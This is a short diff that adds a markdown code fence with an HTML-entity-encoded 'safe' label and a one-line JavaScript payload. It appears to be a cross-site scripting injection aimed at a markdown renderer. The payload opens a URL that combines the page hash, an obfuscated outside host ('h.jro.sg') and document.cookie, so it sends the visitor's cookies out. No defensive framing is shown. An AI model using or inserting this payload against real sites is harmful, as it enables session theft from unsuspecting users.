@@ -1,0 +1,3 @@
+~~~&#x73;&#x61;&#x66;&#x65;
+window.open([location.hash,atob(btoa(/h.jro.sg/)),document.cookie].join(atob(btoa(/h/))[0]))
+~~~
